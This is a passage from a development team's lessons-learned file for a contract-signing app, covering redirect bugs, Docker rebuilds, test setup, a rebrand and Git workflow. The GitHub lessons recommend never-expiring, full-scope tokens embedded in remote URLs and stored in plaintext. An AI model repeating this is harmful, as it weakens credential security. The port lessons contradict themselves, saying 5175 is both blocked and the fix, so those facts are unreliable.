- `navigate('/auth/login')` fired immediately before logout completed
- Redux state still had user data → LoginPage saw authenticated user → redirect loop

**Fix:**
- Fixed currentUser null issue by adding refreshUserProfile on mount (Lesson 21)
- Made `handleLogout` async/await in AdminLayout:
  ```javascript
  const handleLogout = async () => {
    await logout();
    navigate('/auth/login', { replace: true });
  };
  ```

**Files:**
- `apps/sign/src/components/layout/AdminLayout.tsx`
- `apps/sign/src/components/layout/AppLayout.tsx`

**How to Avoid:**
- Always make logout handlers async/await — logout is an async API operation
- Test icon visibility after PAGE REFRESH not just after fresh login
- If icons not showing → check currentUser in Redux DevTools first before debugging CSS

---

## 24. Frontend — Portal Chooser Redirect Loop for Admin Users

**Problem:**
- Users with SYSTEM_ADMIN role were always redirected to `/admin/dashboard`
- Portal chooser page (`/portal-select`) never appeared
- After colleague implemented the portal chooser, it was still bypassed for existing sessions

**Root Cause (Three Issues):**

**Issue 1 — Existing session bypasses LoginPage entirely:**
- Portal chooser redirect logic was only in `LoginPage.tsx`
- Only fires on fresh login flow
- Users with valid token in localStorage → app skips LoginPage completely
- Goes directly to last visited URL (/admin/dashboard)
- Portal chooser never triggered for returning users

**Issue 2 — AdminLayout had no user profile hydration:**
- `AppLayout.tsx` had `refreshUserProfile()` on mount (Lesson 21)
- `AdminLayout.tsx` did NOT have it
- `user` was null when navigating directly to `/admin/*`
- Role check could not run → portal chooser logic never executed

**Issue 3 — Logout race condition (see Lesson 23):**
- Non-async logout caused redirect loops between login and admin pages

**Fix:**
- Added `sessionStorage` flag `portal-chosen` to track portal selection per browser session
- In `AdminLayout.tsx` — added useEffect to redirect if flag not set:
  ```javascript
  useEffect(() => {
    if (isAdminRole && !sessionStorage.getItem('portal-chosen')) {
      navigate('/portal-select');
    }
  }, [user]);
  ```
- In `PortalSelectPage.tsx` — set flag when user clicks either portal button:
  ```javascript
  sessionStorage.setItem('portal-chosen', '1');
  ```
- On logout → clear the flag so chooser shows again next session:
  ```javascript
  sessionStorage.removeItem('portal-chosen');
  ```
- Added `refreshUserProfile()` on mount to AdminLayout (same as AppLayout)

**Files:**
- `apps/sign/src/components/layout/AdminLayout.tsx`
- `apps/sign/src/pages/auth/PortalSelectPage.tsx`

**How to Avoid:**
- Never put role-based redirect logic ONLY in LoginPage — it won't run for existing sessions
- Always use layout-level checks for role-based redirects (AdminLayout, AppLayout)
- Use sessionStorage to prevent repeated redirects within the same browser session
- Always clear sessionStorage portal flags on logout
- Test ALL redirect logic with an EXISTING session (don't logout first before testing)

---

## 25. GitHub — Personal Access Token Expiring

**Problem:**
- Push failed with 403 Permission denied
- Colleague couldn't pull latest updates
- Token had expired — email notification was sent but missed

**Root Cause:**
- GitHub PAT (Personal Access Token) was created with an expiry date
- Token expired → all push/pull operations fail silently with 403

**Fix:**
- Generate new classic PAT at: https://github.com/settings/tokens
- Must use: "Generate new token (classic)" — NOT fine-grained tokens
- Must check: `repo` scope checkbox (full control of repositories)
- Set expiration to: "No expiration" for development tokens
- Classic tokens start with `ghp_` — fine-grained tokens start with `github_pat_`
- Update remote URL: `git remote set-url origin https://TOKEN@github.com/USER/REPO.git`

**How to Avoid:**
- Always set token expiration to "No expiration" for active development
- Save token immediately in a password manager — GitHub shows it only ONCE
- Never share token in chat, email, or screenshots — treat like a password
- If you see `github_pat_` prefix → wrong token type created (fine-grained won't work)
- Best long-term solution: use GitHub CLI (`gh auth login`) — no token management needed

---

## 26. GitHub — Mac osxkeychain Interfering with Token

**Problem:**
- Colleague on Mac couldn't push/pull even with the correct new token
- Error: "Device not configured" or "Invalid username or token"
- Token was verified correct but Mac was using cached old credentials

**Root Cause:**
- Mac stores GitHub credentials in the system keychain (osxkeychain)
- Old expired credentials were cached in keychain
- New token in the remote URL was being ignored — keychain credentials take priority
- The `credential.helper = osxkeychain` Git config intercepts all Git operations

**Fix:**
- Clear cached credentials from Mac keychain:
  ```
  git credential-osxkeychain erase
  host=github.com
  protocol=https
  [press Enter twice]
  ```
- Change credential helper to store:
  `git config --global credential.helper store`
- Update remote URL with new token
- Better permanent solution: Use GitHub CLI:
  `gh auth login` → login via browser → credentials managed automatically

**How to Avoid:**
- Mac developers should use GitHub CLI instead of token-in-URL approach
- `gh auth login` → browser login → no token management needed ever
- Never store token directly in remote URL on Mac (keychain will override it)
- For Windows developers: token in remote URL works correctly without this issue

---

## 27. Clause Extraction — مادة (N) Prefix Appearing in Clause Content

**Problem:**
- Extracted clauses showed `مادة (1)` or `البند رقم (1)` at the start of every clause content
- The clause number was visible TWICE — once in the clause number field AND again at the start of the content
- Made clause content look messy and unprofessional in the UI

**Root Cause:**
- Claude was correctly including the article marker in its JSON response content field
- No stripping was happening before saving to the database
- The `clause_number` field already stores the number separately — repeating it in content was redundant
- Example of wrong output:
  ```
  clause_number: "1"
  content: "مادة (1) موضوع العقد: التصميم الكامل..."
  ```
- Example of correct output:
  ```
  clause_number: "1"
  content: "موضوع العقد: التصميم الكامل..."
  ```

**Fix:**
- Added `_strip_article_prefix()` static method to `ClauseExtractorAgent`
- Regex covers ALL Arabic clause marker variations:
  - `مادة (1)` / `مادة (١)` — with brackets
  - `مادة 1` / `مادة ١` — without brackets
  - `المادة (1)` — with definite article ال
  - `مادة رقم (1)` — with رقم
  - `البند رقم (1)` — Contract Agreement format
  - `البند (1)` — without رقم
  - Optional trailing `: - – —` after the marker
- Called in `_parse_json()` on EVERY clause before returning:
  ```python
  @staticmethod
  def _strip_article_prefix(content: str) -> str:
      return _ARTICLE_PREFIX_RE.sub('', content).strip()
  ```
- Applied on both return paths in `_parse_json()`:
  - Fast path (direct JSON array)
  - Prose-wrapped path (JSON inside text)

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always strip article markers from content before saving — the number lives in `clause_number` field
- After any extraction run verify: `SELECT clause_number, LEFT(content, 50) FROM clauses WHERE source_document_id = '...' LIMIT 5`
- Content should start directly with the clause text — never with `مادة` or `البند`
- If prefix appears → check that `_strip_article_prefix()` is being called in `_parse_json()`

---

## 28. Docker — Backend Not Rebuilt After Colleague Adds npm Packages

**Problem:**
- Login failed with "Invalid email or password" even with correct credentials
- Backend appeared to be running (container was up, health check passed)
- Actual cause: backend failed to compile 3 missing packages from colleague's new module
- TS errors: `Cannot find module 'archiver'`, `Cannot find module 'geoip-lite'`, `Cannot find module 'ua-parser-js'`
- Misleading because the error shown to the user had nothing to do with packages

**Root Cause:**
- Colleague added 3 new npm packages to `package.json` and `package-lock.json` as part of admin-security module
- After pulling the colleague's changes, `docker-compose up -d` was run WITHOUT `--build`
- Docker reused the old cached image — its `node_modules` anonymous volume was created from the old image
- The `- /app/node_modules` anonymous volume in docker-compose.yml preserves node_modules from the image
- Without `--build`, `npm ci` never re-ran → new packages never installed → backend TS compile failed silently
- NestJS still started (using last cached compiled JS) but the admin-security module failed at runtime

**Fix:**
- Installed packages manually in the running container: `docker exec sign-backend npm install archiver geoip-lite ua-parser-js @types/archiver @types/geoip-lite @types/ua-parser-js`
- Then did a proper rebuild to make it permanent: `docker-compose up --build -d backend`
- No code changes needed — packages were already correctly in `package.json` and `package-lock.json`

**File:** `docker-compose.yml` (backend service volumes config)

**How to Avoid:**
- After pulling ANY commit that touches `backend/package.json` or `backend/package-lock.json`:
  ```bash
  docker-compose up --build -d backend
  ```
- Signal to watch for: colleague's PR diff shows changes to `package.json` or `package-lock.json`
- Always check pull safety output for `package.json` changes before running `docker-compose up -d`
- If login or any feature suddenly breaks after a pull with no obvious cause → check backend TS compile errors first:
  ```bash
  docker logs sign-backend 2>&1 | grep -E "error TS|Found [0-9]+ error"
  ```
- Quick fix without rebuild: `docker exec sign-backend npm install <package-name>`

---

## 29. Security — Secrets Audit Before AWS Deployment

**What was found:**
- Root .gitignore was missing .env.staging, .env.production, *.pem, *.key, *.p12, *.pfx
- No per-service .gitignore files existed in backend/, ai-backend/, apps/sign/, apps/cenvox/
- 3 seed passwords were hardcoded in admin-users.seed.ts
- DB fallback credentials hardcoded in data-source.ts and settings.py (low priority)

**What was fixed:**
- Root .gitignore patched with 6 missing patterns
- 4 per-service .gitignore files created
- Seed passwords moved to SEED_ADMIN_PASSWORD_* env vars
- Committed: 405058e

**Still pending (before AWS only):**
- Remove DB fallback credentials in data-source.ts and settings.py
- Create docker-compose.prod.yml

**How to avoid:**
- Run secrets audit before every major deployment
- Never hardcode passwords in seed files
- Always check .gitignore covers all env and certificate patterns

---

## 30. Frontend — Hardcoded localhost:5175 CENVOX Backlinks in SIGN Layouts

**Problem:**
- 4 navigation links in SIGN hardcode localhost:5175 (CENVOX landing page URL)
- Files: AuthLayout.tsx (lines 35, 60), AdminLayout.tsx (line 337), TopBar.tsx (line 57)
- These are the CENVOX attribution links required by brand rules in CLAUDE.md

**Root Cause:**
- Cross-app URLs were hardcoded instead of using env vars

**Fix:**
- Replace all 4 with: `import.meta.env.VITE_CENVOX_URL || 'http://localhost:5175'`
- Add `VITE_CENVOX_URL=http://localhost:5175` to apps/sign/.env and .env.example
- Scheduled for Phase 1.2 (the localhost fix pass)

**How to Avoid:**
- Any URL pointing to another app must always use an env var, never hardcoded

---

## 31. Backend — Silent Catch Blocks Masking Critical Failures

**Problem:**
- 12 catch blocks across the backend were swallowing errors silently
- Most critical: Paymob webhook activation failure returning 200 silently (user charged, never activated — zero visibility)
- Document extraction failures saved FAILED status to DB but no log entry
- DocuSign getSigningUrl failures returned misleading "not a pending signer" message when the real cause was DocuSign API being down

**Root Cause:**
- No standardised error logging pattern enforced across modules
- Some blocks were copy-pasted without adding Logger

**Fix:**
- Added NestJS Logger.error/warn to all 12 silent blocks
- Pattern: `logger.error('[MethodName] context: ${error.message}', error.stack)`
- Non-critical catches (health checks, email fallbacks, snapshots): logger only
- Critical catches: logger + rethrow
- Cron/Bull processor catches: logger only, never rethrow

**How to Avoid:**
- Every catch block must have at minimum a logger.warn call
- Run this after every new module to catch empty blocks early:
  `grep -rn -A2 "} catch" backend/src --include="*.ts" | grep -v "logger\|Logger\|throw\|//\|return"`
- Never use console.log in catch blocks — always NestJS Logger

---

## 32. Backend — Paymob Webhook Activation Needs Idempotency Before Fix

**Problem:**
- subscriptions.service.ts activateSubscription() fails silently inside webhook
- User is charged but subscription never activated
- Cannot simply rethrow — Paymob retries on non-200 responses which would cause double-activation

**Root Cause:**
- No idempotency check before activation
- No DB flag to track webhook processing state

**Temporary Fix (Phase 1.4):**
- Added CRITICAL logger.error with full context
- Added detailed TODO(1.6) comment explaining what needs to be done

**Permanent Fix (Phase 1.6 — pending Paymob test keys):**
- Add idempotency check before activation
- Add DB flag/transaction log for webhook processing state
- Add admin alert when activation fails after payment
- Only return non-200 to Paymob after idempotency is confirmed safe

**How to Avoid:**
- Payment webhooks must always have idempotency before any state mutation
- Never return 200 to a payment provider without confirming the action succeeded

---

## 33. Docker — New npm Package Not Found After Rebuild

**Problem:**
- Added a new npm package (e.g. `joi`) to `backend/package.json`
- Ran `docker-compose up --build -d backend`
- Backend still crashed: `TS2307: Cannot find module 'joi' or its corresponding type declarations`
- Error persisted even after repeated `--build` rebuilds

**Root Cause:**
- `docker-compose.yml` backend service has an anonymous volume: `- /app/node_modules`
- This anonymous volume is created from the image on first run and then persists independently
- `docker-compose up --build` rebuilds the image (running `npm ci` inside), but the container runtime MOUNTS the pre-existing anonymous volume OVER the image's node_modules directory
- The container therefore uses the OLD stale node_modules, not the freshly installed one from the image
- The new package exists in the image layer but is invisible at runtime because the volume shadows it

**Fix:**
```bash
docker-compose up --build --force-recreate --renew-anon-volumes -d backend
```
- `--force-recreate` — recreates the container even if config hasn't changed
- `--renew-anon-volumes` — destroys the anonymous `node_modules` volume and creates a fresh one from the new image layer
- Plain `--build` alone is NOT sufficient when an anonymous `node_modules` volume exists

**File:** `docker-compose.yml` (backend service `- /app/node_modules` anonymous volume)

**How to Avoid:**
- Whenever you add or update any npm package in `backend/package.json`, ALWAYS use the full command:
  ```bash
  docker-compose up --build --force-recreate --renew-anon-volumes -d backend
  ```
- If you see `Cannot find module` for a package you just installed → anonymous volume is stale
- Check what volumes exist: `docker volume ls | grep node_modules`
- Quick alternative (no rebuild): `docker exec sign-backend npm install <package-name>` then restart

---

## 34. Backend — New Required Joi Var Breaks Teammates' Environments

**Problem:**
- Added a new `.required()` entry to the Joi `validationSchema` in `app.module.ts`
- Committed and pushed
- Teammate pulls, runs `docker-compose up -d`, backend crashes immediately:
  `Config validation error: "NEW_VAR" is required`
- Teammate has no idea what `NEW_VAR` is or where to get it

**Root Cause:**
- NestJS Joi validation runs at bootstrap — the app refuses to start if any `.required()` var is missing
- Adding `.required()` to the schema is a **breaking change** for every teammate's local environment
- If the new var is not in `.env.example` (with a description) and the team is not notified, they have no way to know what to add or what value to use

**Fix (process):**
1. In the same commit that adds the new `.required()` var to `app.module.ts`:
   - Add it to `backend/.env.example` with a description comment
   - Add it to your own `backend/.env` with a real value
2. Notify all teammates BEFORE or immediately AFTER pushing:
   > "New required env var added: `NEW_VAR` — you must add it to your local `backend/.env` before next `docker-compose up`. See `.env.example` for description."
3. Default to `.optional().allow('').default('...')` whenever there is a reasonable fallback — only use `.required()` when there is truly no safe default value

**File:** `backend/src/app.module.ts` (Joi `validationSchema`)

**How to Avoid:**
- Treat every new `.required()` Joi var as a breaking change — same discipline as a DB migration
- Never push a new `.required()` var without updating `.env.example` in the same commit
- When in doubt: use `.optional().default('fallback')` — fail-fast is only worth it when there is no sane default
- If a teammate reports "backend won't start after pull" → first check `docker logs sign-backend 2>&1 | grep "Config validation error"` — missing required env var is the most common cause

---

## 35. Testing — AuthService Has 14 Constructor Dependencies

**Problem:**
- Started writing AuthService unit tests by mocking only the obvious dependencies (User repo, JwtService)
- TestingModule.compile() threw: "Nest can't resolve dependencies of the AuthService"
- Each missing service had to be discovered one at a time by error message

**Root Cause:**
- AuthService has 14 constructor injections — 4 repositories, JwtService, ConfigService, EmailService, NotificationDispatchService, plus 6 Phase 3.3 security services (Session, KnownDevice, SuspiciousLogin, GeoLookup, UserAgent, SecurityEvent)
- _finalizeLogin() is private and runs on EVERY successful login path — it touches all 6 Phase 3.3 services

**Fix:**
- Mock every single constructor dependency upfront — read the constructor signature first, write all mocks before instantiating the TestingModule
- For _finalizeLogin testing: do not try to call the private method directly. Call login() and assert on mock call counts (e.g. expect(mockSessionService.create).toHaveBeenCalledTimes(1))

**File:** `backend/src/modules/auth/auth.service.spec.ts`

**How to Avoid:**
- Before writing any service spec, count the constructor parameters and prepare ALL mocks first
- Treat private methods as black boxes — observe behaviour through the public API and mock assertions

---

## 36. Testing — Vite Config Must Stay Untouched, Use Separate vitest.config.ts

**Problem:**
- First instinct was to add a `test: { ... }` block to vite.config.ts
- This works, but pollutes the build config with test-only dependencies
- Risk that future changes to vite.config.ts could affect tests, or vice versa

**Root Cause:**
- Vite and Vitest can share config, but they don't have to
- Mixing them couples build behaviour to test behaviour — bad separation of concerns

**Fix:**
- Created a separate `apps/sign/vitest.config.ts` with its own defineConfig from vitest/config
- vite.config.ts was never modified
- Dev server, build output, and Vite plugins all completely unaffected

**File:** `apps/sign/vitest.config.ts` (new), `apps/sign/vite.config.ts` (untouched)

**How to Avoid:**
- Always create a separate vitest.config.ts unless there is a specific reason to share
- The "shared config" pattern is convenient for tiny projects but a liability for larger ones

---

## 37. Testing — Mock at Service Level Never at Axios Level

**Problem:**
- Considered mocking axios directly with vi.mock('axios') in frontend tests
- Discovered apps/sign/src/services/api/axios.ts imports the Redux store as a side effect:
  `import { store } from '@/store';`
- This means importing axios.ts pulls store initialization into every test
- Also: the response interceptor sets window.location.href = '/auth/login' on 401, which fires in jsdom

**Root Cause:**
- The axios instance is wired into the Redux store and the router — touching axios in tests means touching all of that
- Service-layer mocks (authService, dashboardAnalyticsService) are completely independent of axios internals

**Fix:**
- Always mock at the service level: vi.mock('@/services/dashboard/dashboardAnalyticsService')
- Never import axios.ts in tests
- The store side effect and the redirect interceptor disappear entirely

**File:** `apps/sign/src/pages/app/DashboardPage.test.tsx`, `apps/sign/src/pages/auth/LoginPage.test.tsx`

**How to Avoid:**
- Always mock the highest layer that gives you control — services, not transports
- If a transport file (axios, fetch wrappers) imports stores or routers, mocking it is a trap

---

## 38. Testing — pytest.ini Must Set pythonpath = . or All Imports Fail

**Problem:**
- Created tests/test_clause_extractor.py with `from app.agents.clause_extractor import ClauseExtractorAgent`
- pytest immediately failed: ModuleNotFoundError: No module named 'app'
- pytest discovered tests but could not resolve the project root

**Root Cause:**
- pytest's default rootdir detection does not add the project directory to sys.path
- Without explicit pythonpath config, "from app.X" cannot resolve
- Inside Docker the same imports work because the container WORKDIR is /app/

**Fix:**
- Created ai-backend/pytest.ini with `pythonpath = .`
- Now pytest treats ai-backend/ as the project root for imports

**File:** `ai-backend/pytest.ini`

**How to Avoid:**
- For any new pytest project: create pytest.ini with pythonpath = . FIRST, before writing any test
- Do not rely on conftest.py sys.path hacks — pytest.ini is the canonical solution

---

## 39. Testing — Celery bind=True Tasks Need .run(payload) Not task(None, payload)

**Problem:**
- Tried to call run_extract_clauses(None, request_data) directly in a test
- Got: TypeError: run_extract_clauses() takes 2 positional arguments but 3 were given
- Confusing because the function signature literally is (self, request_data) — that's 2 args

**Root Cause:**
- Celery's @task decorator with bind=True wraps the function in a Task object
- Calling task(args) goes through the Task.__call__ proxy which auto-injects self
- So task(None, payload) becomes (self=task_instance, None, payload) — 3 args total

**Fix:**
- Use task.run(payload) instead — .run() is the unwrapped function with self already bound
- Pattern: `result = run_extract_clauses.run({"full_text": "..."})`
- This bypasses the Celery proxy entirely and calls the raw function

**File:** `ai-backend/tests/test_tasks.py`

**How to Avoid:**
- For bind=True Celery tasks, always use .run() in tests — never call the task object directly with self as the first arg
- For bind=False tasks, calling the task directly works as expected

---

## 40. DTOs — Fields Without Class-Validator Decorators Are Silently Stripped

**Problem:**
- `AddReplyDto.is_internal_note` had a TypeScript type (`?: boolean`) but zero class-validator decorators
- NestJS ValidationPipe with `whitelist: true` stripped it silently on every request
- Every intended internal note was saved as a public reply — no error, no warning

**Root Cause:**
- `whitelist: true` removes any property that has no class-validator decorator, regardless of TypeScript type
- TypeScript types are compile-time only — class-validator decorators are runtime metadata
- A property typed as `boolean` but missing `@IsBoolean()` is invisible to the ValidationPipe

**Fix:**
- Added `@IsBoolean()` to `AddReplyDto.is_internal_note`
- Rule: every DTO property that should reach the handler MUST have at least one class-validator decorator

**File:** `backend/src/modules/support/dto/create-ticket.dto.ts`

**How to Avoid:**
- When adding a field to a DTO, always add a class-validator decorator at the same time — never a bare TypeScript type
- Audit DTOs by looking for `@IsOptional()` without any other decorator — those fields are stripped

---

## 41. Defense-in-Depth — Frontend Filters Are Never Enough

**Problem:**
- The only filter hiding internal notes from customers was a `.filter()` call in the React component
- Any API client (curl, Postman, mobile app) bypassed it entirely

**Root Cause:**
- Single-layer security where the only enforcement was client-side
- Backend returned all replies including `is_internal_note = true` for all users

**Fix:**
- Added DB-level `WHERE is_internal_note = false` filter in `SupportService.getTicketById` for non-staff users
- Added ownership check (`ForbiddenException`) so users can only view their own tickets
- Frontend filter now serves as a UX layer only, not security enforcement

**File:** `backend/src/modules/support/support.service.ts`

**How to Avoid:**
- Every access-control decision must be enforced at the service/DB layer
- Frontend visibility filters are UX only — treat them as if they don't exist when reasoning about security

---

## 42. @MaxLength — Apply to BOTH Create AND Update DTOs

**Problem:**
- Added `@MaxLength` to all create DTOs but initially missed standalone update DTOs
- A PATCH request to `/projects/:id` with a 100,000-character `objective` bypassed all limits

**Root Cause:**
- `PartialType(CreateXxxDto)` inherits all decorators — but standalone update DTOs inherit nothing
- 4 update DTOs (`update-project.dto.ts`, `update-obligation.dto.ts`, `update-plan.dto.ts`, `update-knowledge-asset.dto.ts`) were standalone classes, not PartialType wrappers

**Fix:**
- Added same `@MaxLength` tiers to all 4 standalone update DTOs
- Tiers: 500 (identifiers), 10,000 (comments), 20,000 (descriptions), 500,000 (clause content)

**File:** All `update-*.dto.ts` files in backend/src/modules/*

**How to Avoid:**
- When adding validation to a create DTO, immediately check whether the update DTO uses `PartialType` or is standalone
- If standalone — apply the same constraints manually

---

## 43. sanitize-html — Correct Import Syntax When esModuleInterop Is Off

**Problem:**
- Used `import sanitizeHtml from 'sanitize-html'` (default import)
- TypeScript compiled it with `allowSyntheticDefaultImports: true` — no TS error
- At runtime: `sanitize_html_1.default is not a function` — the default export was `undefined`

**Root Cause:**
- `@types/sanitize-html` uses `export = sanitize` (CommonJS `module.exports = ...`)
- `allowSyntheticDefaultImports` silences the TypeScript error but provides NO runtime shim
- `esModuleInterop` is required for a runtime shim — the project's tsconfig doesn't have it
- Without the shim, `import X from 'pkg'` for a `module.exports =` package gives `undefined` at runtime

**Fix:**
- `import * as sanitizeHtml from 'sanitize-html'` — correct for `export =` modules without `esModuleInterop`
- Null guard in the helper: `if (value == null || typeof value !== 'string') return value`
- Reason for null guard: `@Transform` fires on `undefined` for optional fields — must not pass to sanitizer

**File:** `backend/src/common/utils/sanitize.ts`

**How to Avoid:**
- For any npm package typed with `export =`: use `import * as X from 'pkg'`
- Check `@types/pkg/index.d.ts` — if the last line is `export = something`, you need namespace import
- `allowSyntheticDefaultImports: true` in tsconfig is a trap — it hides the error at compile time but not at runtime

---

## 44. Rebrand — Parent Brand Switched from CENVOX to MANAGEX

**Problem:**
The product needed a full parent-brand rebrand from CENVOX (orange combustion theme, hexagonal C+V mark, Syne/Instrument Sans typography) to MANAGEX (electric-cyan, M+X mark with 3 pillars and luminous dot, Bricolage Grotesque/DM Sans typography). The landing page, the SIGN app attribution, the workspace package names, and Docker config all had to change in one session without breaking the SIGN app.

**Root Cause:**
- Brand naming had leaked into 18 source files (including workspace package names `@cenvox/landing`, `@cenvox/sign`, `@cenvox/tokens`) and into Docker service names, the launch.json config, and the SIGN app's CSS class names (`.cenvox-backlink`, `.cenvox-attribution`, `.sign-cenvox-attribution`).
- Token file `cenvox.css` exposed `--cx-*` variables that the landing page used heavily but the SIGN app didn't reference (confirmed by greps returning zero hits inside `apps/sign`). This meant the dark/orange landing tokens could be retired safely but the SIGN-app extension palette (`--cx-brand-primary*`, `--cx-navy-*`) had to be preserved (renamed to `--mx-sign-primary*` / `--mx-navy-*`).

**Fix:**
- Renamed `apps/cenvox` → `apps/managex` and `packages/tokens/cenvox.css` → `packages/tokens/managex.css` via `git mv` (preserves history).
- Replaced the token file contents with a new `--mx-*` system (split dark/light zones + cyan brand) and a SIGN-namespaced extension palette so SIGN app keeps compiling.
- Rebuilt the landing page from scratch: new `ManagexLogo` + `HeroDashboard` components, a single `App.tsx` covering Nav → Hero → Logos → Lifecycle → Products → Why → Testimonials → Mission → CTA → Footer, and a fresh `index.css` with `mx-*` class names.
- Updated SIGN: `apps/sign/src/styles/index.css` imports `@managex/tokens/managex.css`; replaced `.cenvox-backlink` → `.managex-backlink`, recolored from orange to cyan; rewrote the auth-page orange SVG glyph as the small MANAGEX mark.
- Updated docker-compose service `cenvox` → `managex`, container `sign-cenvox` → `sign-managex`, Dockerfile paths, `.claude/launch.json`, root `package.json` scripts.

**File(s):** `apps/managex/**`, `packages/tokens/**`, `apps/sign/src/styles/index.css`, `apps/sign/src/components/layout/{TopBar.tsx,AdminLayout.tsx}`, `apps/sign/src/components/common/AuthLayout.tsx`, `apps/sign/package.json`, `apps/word-addin/src/taskpane/{App.tsx,styles/global.css}`, `docker-compose.yml`, `docker-compose.frontend.yml`, `apps/managex/Dockerfile`, `.claude/launch.json`, `package.json`, `README.md`, `CLAUDE.md`.

**How to Avoid:**
- For any future brand swap, run `grep -ri "BRANDNAME"` and `grep -r "\-\-cx-"` (or whichever token prefix is in scope) BEFORE starting work so you understand the blast radius. The grep returning zero hits in the SIGN app meant the landing-only `--cx-*` palette could be removed without touching SIGN.
- Use `git mv` instead of cp + rm so renames are tracked as renames and reviewers can diff cleanly.
- Always rename the workspace package name AND every `dependencies` reference in the same commit, or `npm ci` will fail at build time.
- After renaming a Docker service, also rename its container_name and the anonymous-volume path under it (`/app/apps/managex/node_modules`) — otherwise the next `docker-compose up` will spin up two parallel containers.
- Keep the orange/CENVOX SVG glyph code archived (in this lesson) in case the rebrand has to be partially rolled back.

---

## 45. Preview — Vite Cannot Bind 5175 While Docker Is Running

**Problem:**
After the rebrand, running the MANAGEX landing page in the Claude preview pane reported `Port 5175 is required by this server but is in use by another process`. `lsof -ti :5175` returned a single PID belonging to `com.docker.backend services` — Docker itself was holding the port.

**Root Cause:**
The repo's `docker-compose.yml` exposes the `managex` (formerly `cenvox`) service on host port 5175. Once `docker-compose up` has been executed, Docker's backend daemon continues to hold port 5175 even after the container is stopped, until Docker Desktop itself is restarted. The preview tool's autoPort mechanism injects a `PORT` env var, but Vite reads `--port` and ignores `PORT`, so autoPort had no effect on the dev server's actual bind address.

**Fix:**
- Updated `.claude/launch.json` to use port 5175 with explicit `--port 5175 --strictPort` flags passed to Vite via `runtimeArgs: ["run", "dev", "--", "--port", "5175", "--strictPort"]`. Kept `autoPort: false` so the preview pane targets the known port deterministically.
- Documented in CLAUDE.md "Preview port quirk" — 5175 is reserved for Docker, 5175 is the local dev port.

**File:** `.claude/launch.json`

**How to Avoid:**
- When picking a preview port for a service that also has a docker-compose mapping, do not reuse the docker host port. Pick a sibling port (5175, 8081, etc.) and document it.
- Vite respects `--port` and ignores `PORT` — if you want a port to actually take effect, pass it via CLI args, not env vars.
- For preview-tool autoPort to work with Vite, the start command must read the PORT env (e.g., `vite --port $PORT`); otherwise leave autoPort off and hardcode the port.

---

## 46. Ports — 5175 Is the Canonical MANAGEX Landing Port

**Decision:**
Port 5175 is now the canonical local-development port for the MANAGEX landing page across the entire monorepo. The previous port (one less than 5175) is retired and must not be reintroduced anywhere — code, configs, docs, Dockerfiles, docker-compose, env files, or markdown.

**Root cause for the migration:**
Docker Desktop's `com.docker.backend` daemon keeps the prior host port bound after `docker-compose up` is run, so Vite (and the Claude preview tool) cannot bind it again without restarting Docker. Rather than fight this, the old port was abandoned. Every reference was rewritten to 5175 in one global pass.

**Files touched in the global migration (2026-05-13):**
- `apps/managex/vite.config.ts` (server.port)
- `apps/managex/Dockerfile` (EXPOSE + CMD --port)
- `docker-compose.yml` (managex service host:container mapping)
- `docker-compose.frontend.yml` (managex service host:container mapping)
- `backend/src/main.ts` (CORS allowlist entry)
- `apps/sign/src/components/layout/AdminLayout.tsx` (MANAGEX backlink href)
- `apps/sign/src/components/common/AuthLayout.tsx` (sub-brand tag + footer attribution hrefs)
- `CLAUDE.md`, `lessons.md`, `README-DEV.md`, `docs/BUILD_STATUS_REPORT.md` (all docs)

**Production rule:**
When deploying to production, every `http://localhost:5175` reference becomes `https://managex.ai/`. There is no other place the MANAGEX landing will be served from.

**How to Avoid Regressions:**
- Before merging any PR, run `grep -r "517" . --exclude-dir=node_modules --exclude-dir=.git` and confirm the only port digit-strings present are 5173 (SIGN dev), 5175 (MANAGEX), and 5180 (SIGN dev override). The previous MANAGEX port must not reappear.
- New landing-page features that need a port must use 5175. Tooling defaults (Vite's 5173, etc.) are off-limits — both are claimed by SIGN's dev server.
- If a teammate proposes restoring the prior MANAGEX port because "Docker holds 5175 now," investigate Docker state instead — never split the port between environments.

---

## 47. Coordination — "Done" = On Main With Green CI, Never "Pushed to a Branch"

**Problem:**
Two feature branches (MANAGEX rebrand and legal layer) were considered "done" by the developer because the code was pushed to a remote branch. Both went undiscovered for days. When found:
- Both had to be rebased because main had moved forward
- The MANAGEX branch required 4 CI fix cycles
- The legal layer branch required a clean rebase over Phase 3.2 AND the MANAGEX commit
- Hours of coordination time could have been saved with immediate PRs

**Root Cause:**
No shared definition of "done." "I pushed the branch" was treated as completion, not as work-in-progress.

**Fix:**
Work is NOT done until: (1) branch pushed, (2) PR opened against main, (3) CI green on all 3 jobs, (4) PR merged to main. Any earlier state = work in progress.

**File:** Team agreement — applies to every developer.

**How to Avoid:**
- Never say "it's done" or "I shipped it" without a merged PR link
- Use GitHub PR status as the canonical source of truth, not branch existence

---

## 48. Rebrand — Always Run a Negative-Filter Sweep After a Big Rename

**Problem:**
The MANAGEX rebrand (71 files) used a positive-filter grep (`--include="*.ts,*.tsx,*.json"`). This missed:
- `.github/workflows/ci.yml` — found during CI failure
- `apps/sign/Dockerfile` — found in post-CI sweep
- `apps/word-addin/manifest.xml` ProviderName — found in third sweep
- `apps/word-addin/manifest.localhost.xml` — found in third sweep
- `apps/word-addin/README.md` — found in third sweep
- `README-DEV.md` dev commands — found in third sweep
- `package-lock.json` stale workspace entry — found in third sweep

**Root Cause:**
`--include` silently excludes files with no extension (Dockerfile), unusual extensions (.xml), and generated files (.lock).

**Fix:**
Use a NEGATIVE filter as the final verification for any rename:
```bash
grep -rni "OLD_NAME" . \
  --exclude-dir=node_modules --exclude-dir=.git \
  --exclude-dir=dist --exclude-dir=build \
  --exclude-dir=coverage \
  --exclude="*.lock" --exclude="*.log"
```
Then classify each hit: "functional" (change it) vs "historical" (leave it).

**File:** Any rename operation.

**How to Avoid:**
Never use `--include` for a rebrand sweep — always use a blanket grep with targeted exclusions.

---

## 49. Coordination — Rebasing Requires Pulling BEFORE Opening a PR

**Problem:**
Two PRs were opened from branches that were cut weeks before the current state of main:
- `feat/legal-layer` was cut from `be13d6b` (Phase 2) — would have silently dropped Phase 3.2 security work if merged without rebasing
- `claude/quirky-khorana-1d5fcc` was cut from `602cf77` (before Phase 3.2) — same risk

**Root Cause:**
Developers opened PRs without checking whether their branch was behind `origin/main`.

**Fix:**
Before opening any PR, always run:
```
git fetch origin
git log HEAD..origin/main --oneline
```
If this returns ANYTHING, rebase first:
```
git rebase origin/main
```
Resolve conflicts on YOUR branch, then force-push, then open the PR. CI confirms everything coexists.

**File:** Pre-PR workflow — applies to every developer.

**How to Avoid:**
